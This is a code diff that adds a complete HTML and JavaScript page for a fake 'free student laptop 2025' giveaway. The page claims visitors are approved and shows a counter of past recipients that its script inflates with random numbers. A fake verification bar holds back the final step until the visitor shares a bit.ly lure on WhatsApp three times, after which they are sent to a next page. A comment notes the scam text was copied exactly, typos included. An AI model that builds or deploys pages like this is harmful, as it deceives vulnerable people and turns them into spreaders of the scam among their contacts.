@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Students Laptops Support - Step 3</title>
+    <style>
+        /* CSS for styling the page */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            padding-top: 20px; /* Add some space at the top */
+        }
+
+        .container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            border: 1px solid #ddd;
+        }
+
+        .header-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .header {
+            background-color: #f0f2f5; /* Light gray */
+            padding: 15px;
+            font-weight: bold;
+            font-size: 1.2em;
+            color: #000;
+        }
+
+        .info-bar {
+            background-color: #a8d5a9; /* Light green */
+            padding: 10px 20px;
+            color: #000;
+        }
+
+        .info-bar p {
+            margin: 5px 0;
+        }
+
+        .info-bar .count {
+            color: #ff0000; /* Red */
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+
+        .content {
+            padding: 20px;
+            text-align: left;
+            color: #333;
+        }
+
+        .content > p {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .instructions p {
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+
+        .progress-container {
+            width: 80%;
+            background-color: #e0e0e0;
+            border-radius: 25px;
+            margin: 20px auto;
+            overflow: hidden;
+            border: 1px solid #ccc;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 20px;
+            background-color: #4CAF50; /* Green */
+            border-radius: 25px;
+            transition: width 1.5s ease-in-out;
+        }
+
+        .btn {
+            display: block;
+            width: 80%;
+            padding: 15px;
+            margin: 15px auto;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1.5em;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none; /* For the <a> tag */
+        }
+        
+        .btn:last-of-type {
+            margin-bottom: 30px;
+        }
+
+        .btn-share {
+            background-color: #008000; /* Green */
+        }
+
+        .btn-validate {
+            background-color: #ff0000; /* Red */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="Laptop-offer.jpg" alt="Free Laptops for 2025 Students Edition" class="header-image">
+        <div class="header">
+            STUDENTS LAPTOPS SUPPORT 2025
+        </div>
+        <div class="info-bar">
+            <p>Till Today</p>
+            <p class="count">60594</p>
+            <p>Students have taken advantage of this offer.</p>
+        </div>
+        <div class="content">
+            <p>Congratulations,</p>
+            <p>After checking your applications, You have been approved to Receive The Students Support Laptop. <strong>(APPROVED)</strong>. How to proceed:</p>
+            
+            <div class="instructions">
+                <!-- Replicating text exactly, including typos -->
+                <p>Your Students Support Laptop will be availabe immediately if you follow instructions below;;</p>
+                <p>2. Click the "SHARE" button to share this information with 15 friends or 5 groups on WhatsApp so That They Can Also Be Aware of the PROGRAM! "</p>
+                <p>3. Then click "VALIDATE" after the GREEN verification bar is filled.</p>
+                <p>4. You will receive a confirmation sms within 15 minutes.</p>
+            </div>
+        </div>
+
+        <div class="progress-container">
+            <div id="progressBar" class="progress-bar"></div>
+        </div>
+        
+        <a id="shareButton" href="#" class="btn btn-share">SHARE</a>
+        <button id="validateButton" class="btn btn-validate">VALIDATE</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const shareButton = document.getElementById('shareButton');
+            const validateButton = document.getElementById('validateButton');
+            const progressBar = document.getElementById('progressBar');
+            const countElement = document.querySelector('.info-bar .count');
+            
+            const requiredShares = 3; 
+            let shareCount = 0;
+
+            if (countElement) {
+                let currentCount = parseInt(countElement.innerText.replace(/,/g, ''), 10);
+                setInterval(() => {
+                    const increment = Math.floor(Math.random() * (40 - 10 + 1)) + 10;
+                    currentCount += increment;
+                    countElement.innerText = currentCount.toLocaleString();
+                }, 1000); 
+            }
+
+            shareButton.addEventListener('click', (event) => {
+                event.preventDefault();
+                if (shareCount < requiredShares) {
+                    shareCount++;
+                    const progressPercentage = (shareCount / requiredShares) * 100;
+                    progressBar.style.width = progressPercentage + '%';
+                    
+                    const shareText = "Congratulations! I've been approved for the Students Laptop Support Program 2025. You can also apply for a free laptop here: ";
+                    const shareLink = "https://bit.ly/Free-Student-Laptops-2025"; 
+                    const fullMessage = shareText + shareLink;
+                    const message = encodeURIComponent(fullMessage);
+                    
+                    // Attempt to open WhatsApp
+                    window.location.href = `whatsapp://send?text=${message}`;
+                } else {
+                    alert("You have already completed the sharing step. Please click VALIDATE.");
+                }
+            });
+
+            validateButton.addEventListener('click', () => {
+                if (shareCount >= requiredShares) {
+                    // If sharing is complete, redirect to the "forth-page.html".
+                    window.location.href = 'forth-page.html'; // <<< KEY CHANGE HERE
+                } else {
+                    const remaining = requiredShares - shareCount;
+                    alert(`Please click the SHARE button ${remaining} more time(s) to complete the verification.`);
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
